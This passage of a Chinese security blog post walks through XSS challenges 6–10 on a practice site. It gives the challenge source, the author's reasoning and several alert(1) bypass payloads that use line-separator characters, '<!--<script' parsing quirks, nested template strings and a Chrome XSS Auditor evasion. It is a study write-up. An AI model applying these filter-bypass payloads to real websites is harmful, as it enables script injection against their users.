+<h2 id="0x06-xsstest6（boss）"><a href="#0x06-xsstest6（boss）" class="headerlink" title="0x06 xsstest6（boss）"></a>0x06 xsstest6（boss）</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest6/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest6/</a></p>
+<p>和第五关类似，有个JSONP接口，查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">"./index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> orguin = $.Tjs_Get(<span class="string">'uin'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(orguin&lt;=<span class="number">0</span>) <span class="built_in">window</span>.location=<span class="string">"./user.php?callback="</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;script type="text/javascript" 	src="http://px1624.sinaapp.com/pxpath/'</span>+<span class="built_in">decodeURIComponent</span>(orguin)+<span class="string">'&amp;'</span>+<span class="built_in">Math</span>.random()+<span class="string">'"&gt;&lt;\/script&gt;'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Give me xss bypass 6~【任意浏览器弹1就算通过】</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只有一个输入点即uin参数，如果该参数不为空则进行DOM操作写入script标签的src属性值的url路径中拼接起来，期间做了次URL解码操作。</p>
+<p>这题公认最难，具体分析过程参考：<a href="https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg</a></p>
+<p>这里直接给出payload，仅在旧版Chrome中生效，新版的对location.hash的特殊字符也进行了URL编码，所以导致<code>\u2028</code>和<code>\u2029</code>这种换行符的解析失效，从而不能用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?#11?\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)</span><br><span class="line">?#11?\u2029&amp;uin=../test/xsstest5/user.php?callback=alert(1)</span><br></pre></td></tr></table></figure>
+<p>简单地说，目的很简单，就是写入<code>?uid=</code>，但是问号<code>?</code>和百分号<code>%</code>在index.js中被过滤了，此时就可以应用换行符来进行绕过正则的过滤。但是<code>\n</code>和<code>\r</code>这些换行符在浏览器中输入会被自动进行URL编码再发起请求导致<code>%</code>被过滤所以无法成功。但除了前面两个换行符，在JS中还支持<code>\u2028</code>和<code>\u2029</code>这两个。此外，JSONP接口中限制了字符长度不能大于7个字符，alert(1)是8个字符，所以直接写是不行的。这里有两种思路，一是利用第五题的JSONP接口alert(1)，另一种是利用name进行传参，然后利用jq的domxss的特性，进行构造。</p>
+<h2 id="0x07-xsstest7"><a href="#0x07-xsstest7" class="headerlink" title="0x07 xsstest7"></a>0x07 xsstest7</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest7/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest7/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="string">'px'</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>推测出px参数。尝试前面的方法发现注释符被转义了，没法直接在第一个script标签处完成弹框：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/20.png" alt=""></p>
+<blockquote>
+<p>很多人似乎想到第四题，我们可以不可以把其中一部分内容当做模板字符串，但是你会发现还是有区别的，因为第四题的输出点2个位置都在js环境里，而这里是一个在js中一个在html中，所以直接这样肯定是不行的，因为不管你怎么构造，你都会发现script标签里的输出部分最后面的这个单引号没办法解决。</p>
+</blockquote>
+<p>通过测试发现，JS和HTML两个输出点处理的不一样，JS输出点是对特殊字符进行转义，而HTML输出点是进行了HTML实体编码：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/21.png" alt=""></p>
+<p>题目考察点肯定和前面不同。观察到这里源码中有个<code>&lt;!--px--&gt;</code>和<code>&lt;script&gt;&#39;px&#39;&lt;/script&gt;</code>，看似无用，其实就是出题人的疯狂暗示。这就是考察点：<a href="https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/</a></p>
+<p>简单地说，<strong>在script标签里面如果遇到了 <code>&lt;!--</code>那么这个的解析优先级会变成最高，如果这个后面再出现 <code>&lt;script&gt;</code> 标签，那么最近的另一个<code>&lt;/script&gt;</code>标签就会优先去先闭合这个，从而打破了原先跳不出script标签限制的这个点</strong>。</p>
+<p>这里尝试一下，由于script标签的尖括号被过滤，所以我们在后面加个空格即可、不影响成功解析：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/22.png" alt=""></p>
+<p>看到红框，在最上面的script标签中插入<code>&lt;!--</code>会导致红框括起来的部分优先级比外部的script标签高，此时在<code>&lt;!--</code>后面插入<code>&lt;script</code>标签会闭合掉原本最上面script标签对应的<code>&lt;/script&gt;</code>标签如绿框部分，而最上面的<code>&lt;script&gt;</code>则匹配的<code>--&gt;</code>之后的<code>&lt;/script&gt;</code>，从而突破了原本的script标签。</p>
+<p>最终payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?px=\&apos;-`-alert(1)//&lt;!--&lt;script &gt;</span><br><span class="line">?px=\&apos;-alert(1)`//&lt;!--&lt;script </span><br><span class="line">?px=&lt;!--&lt;script \&apos;-`-alert(1)//</span><br><span class="line">?px=&lt;!--&lt;script \&apos;-alert(1)`//</span><br><span class="line">?px=&lt;!--&lt;script `)/*\&apos;%0aalert(1)%0aalert(`*///</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/23.png" alt=""></p>
+<h2 id="0x08-xsstest8"><a href="#0x08-xsstest8" class="headerlink" title="0x08 xsstest8"></a>0x08 xsstest8</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest8/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest8/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px1624=<span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~8</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>推测参数为px。测试发现有4个输出点，其中两个在JS中，另外两个在HTML中，其中第一个HTML输出点限制了长度：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/24.png" alt=""></p>
+<p>测试下过滤点，JS中是对特殊字符进行了转义，而HTML中的则是两个处理方式都不同、一个是HTML编码和转义、另一个是直接输出在html标签的属性值中：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/25.png" alt=""></p>
+<p>那就在最后一个HTML输出点中搞起，尝试<code>&quot; onxxx=alert(1)</code>，先闭合双引号，发现直接被过滤替换为字符串”px_xss”了：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/26.png" alt=""></p>
+<p>这种思路是没戏的，看下能不能像前面一样利用<code>&lt;!--&lt;script&gt;</code>来跳出script标签限制。由于前面两处JS输出点是同步输出且第一处HTML输出点对尖括号进行了HTML实体编码，因此实际能用的只有最后的那个HTML输出点。</p>
+<p>我们直接像前面那样输入构造，然并卵，这里JS中输出点的<code>&lt;!--&lt;script&gt;</code>会把页面中唯一的<code>&lt;/script&gt;</code>吃掉，但是由于<code>&lt;!--&lt;script&gt;</code>有多个，因此原本最上面的<code>&lt;script&gt;</code>标签一直未能成功闭合：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/27.png" alt=""></p>
+<p>既然是因为script标签未闭合导致后面都被当作是标签内的内容导致无法成功弹框，那么就往<code>&lt;!--</code>后面注入个<code>&lt;/script&gt;</code>来闭合，虽然有4个输出点，但前面两个JS输出点由于有转义符所以其中的<code>&lt;/script&gt;</code>并不会被成功识别解析，而第三个输出点是进行了HTML实体编码也不会被成功解析，但是最后的输出点是原封不动地输出到input标签的value属性值中，通过<code>&lt;!--</code>的特性可使其后的<code>&lt;/script&gt;</code>优先级高于input标签而去匹配其前面的<code>&lt;script&gt;</code>标签：</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/28.png" alt=""></p>
+<p>OK，跳出原先的script标签并闭合掉了最上面的<code>&lt;script&gt;</code>标签，此时多了注入的<code>&lt;script&gt;</code>标签来了，这就简单了，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?px=&lt;!--&lt;/script&gt;&lt;script &gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/29.png" alt=""></p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/30.png" alt=""></p>
+<p>当然这个payload是不能过Chrome的XSS Filter的，虽然最新版的Chrome把XSS Filter去掉了，但低版本的话就没戏了，不通用。</p>
+<p>如何通用呢？参考思路是利用了前面看到的将双引号过滤为px_xss字符串来构造的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?px=&lt;!--&lt;/script&gt;&lt;script &gt;&quot;=alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/31.png" alt=""></p>
+<blockquote>
+<p>为什么这样就可以了？估计很多人肯定一脸懵逼吧。这个要先了解下谷歌xss filter的运行机制，如下图，主要是将输出的代码和URL中的代码进行对比，如果不同就会默认为安全输出。</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/32.png" alt=""></p>
+<p>那么就很好理解了，前面几个人的这个payload，输出和URL是一样的，所以会被xss filter认为是有XSS风险，进行拦截。</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/33.png" alt=""></p>
+<p>ID：香草 的这个，巧妙的利用了此题对双引号过滤为实体字符的策略，这样输出和URL位置就不一样了，所以xss filter就不会进行拦截了。</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/34.png" alt=""></p>
+<p>此题你会发现，上面的答案控制台是会报错的，因为这里等于是重写写入了一个script标签对，然后报错是因为之前的那个script里面语法各种报错了。</p>
+</blockquote>
+<h2 id="0x09-xsstest9"><a href="#0x09-xsstest9" class="headerlink" title="0x09 xsstest9"></a>0x09 xsstest9</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest9/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest9/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px1624=<span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~9</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="string">'px'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>和第八题类似，还是四处输出点，区别就是这里对双引号的过滤方式进行了改变，而且对2处HTML位置的输出点都做了HTML编码，并且同步限制了长度。所以想着用上面的方法直接写入标签，那基本上是不可能的了。</p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/35.png" alt=""></p>
+<p>这题思路构造对本人来说过于复杂，就直接看payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?px=1\&apos;-&#123;a:`&#125;-alert(1)//`&#125;-&#123;a:`$&#123;`&lt;!--&lt;script &gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/36.png" alt=""></p>
+<p><img src="/2020/07/11/一些BAT的XSS实例/37.png" alt=""></p>
+<p>简单说下涉及的Tricks：</p>
+<ul>
+<li>使用JS模板字符串连接闭合掉无用的数据，如果不行则使用内嵌模板字符串的形式来内嵌掉一些字符串再闭合掉其余的（模板字符串及其嵌套模板参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings）；" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings）；</a></li>
+<li>使用<code>&lt;!--&lt;script &gt;</code>来跳出原script标签的限制；</li>
+<li>遇到大括号同步闭合的问题时，可以想到<code>function(){}</code>和<code>if(){}</code>以及<code>{a:1}</code>这几种，从3者的构造灵活度上来看，无疑第三种的这个对象是最合适的，所以我们这里用对象进行构造；</li>
+</ul>
+<h2 id="0x0A-xsstest10"><a href="#0x0A-xsstest10" class="headerlink" title="0x0A xsstest10"></a>0x0A xsstest10</h2><p>题目地址：<a href="http://px1624.sinaapp.com/test/xsstest10/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest10/</a></p>
+<p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px=<span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> px1624=<span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~10</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="string">"px"</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这题也没搞出来，直接看参考答案吧。</p>
+<blockquote>
+<p>看着好像和第九题差不多，也是4处输出，js中的过滤规则是一样的，不同的是html中第一处的输出将字符限制的只有2个了，第二处没有限制长度。这样的话，即使知道了上面的构造思路，但是在构造上整体还是比第九题要难一些，因为毕竟2个字符长度能做的事情还是比较有限的。</p>
+</blockquote>
+<p><img src="/2020/07/11/一些BAT的XSS实例/38.png" alt=""></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?px=`&#125;\&apos;-&#123;a:`&#125;-alert(1)//`&#125;-&#123;a:`$&#123;`$&#123;`&lt;!--&lt;script &gt;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/11/一些BAT的XSS实例/39.png" alt=""></p>
+<h2 id="0x0B-more"><a href="#0x0B-more" class="headerlink" title="0x0B more"></a>0x0B more</h2><p>看下更多的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xsstest8</span><br><span class="line">?px=\&apos;-&#123;a:`&#125;-alert(1)//&lt;/script&gt;`&#125;-&#123;a:`$&#123;`&lt;!--&lt;script &gt;</span><br><span class="line">?px=\&apos;-&#123;a:`&#125;-alert(1)//&lt;/script&gt;&lt;!--&lt;script &gt;`&#125;-&#123;c:`$&#123;`</span><br><span class="line"></span><br><span class="line">8、9、10通用</span><br><span class="line">?px=`&#125;-alert(1)//&lt;/script&gt;`&#125;-&#123;a:`$&#123;`\&apos;-&#123;a:`&#125;$&#123;`&lt;!-- &lt;script &gt;</span><br><span class="line">?px=`&#125;//&lt;/script&gt;1111111`-alert(1)-&#123;a:`$&#123;`\&apos;-`&#125;$&#123;`&lt;!--&lt;script &gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在这10个BAT的XSS实例的解法思路中，我们用到了javascript中的运算符、模板字符串、嵌套模板、正则表达式、换行符、对象等知识。以及用到了断点调试、控制台分析、本地代码映射等方法。</p>
+</blockquote>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-xsstest1"><span class="toc-text">0x01 xsstest1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#方法一：分析代码并在Console中构造调试"><span class="toc-text">方法一：分析代码并在Console中构造调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法二：JavaScript断点调试"><span class="toc-text">方法二：JavaScript断点调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法三：基于报错的JS调试"><span class="toc-text">方法三：基于报错的JS调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-xsstest2"><span class="toc-text">0x02 xsstest2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-xsstest3"><span class="toc-text">0x03 xsstest3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-xsstest4"><span class="toc-text">0x04 xsstest4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-xsstest5"><span class="toc-text">0x05 xsstest5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-xsstest6（boss）"><span class="toc-text">0x06 xsstest6（boss）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-xsstest7"><span class="toc-text">0x07 xsstest7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-xsstest8"><span class="toc-text">0x08 xsstest8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-xsstest9"><span class="toc-text">0x09 xsstest9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-xsstest10"><span class="toc-text">0x0A xsstest10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-more"><span class="toc-text">0x0B more</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/07/09/Struts2基础篇之ValueStack（值栈）/" rel="next" title="Struts2基础篇之ValueStack（值栈）">
+          Struts2基础篇之ValueStack（值栈）
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/07/19/SQL语句利用日志写shell及相关绕过/" rel="prev" title="SQL语句利用日志写shell及相关绕过">
+            SQL语句利用日志写shell及相关绕过
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
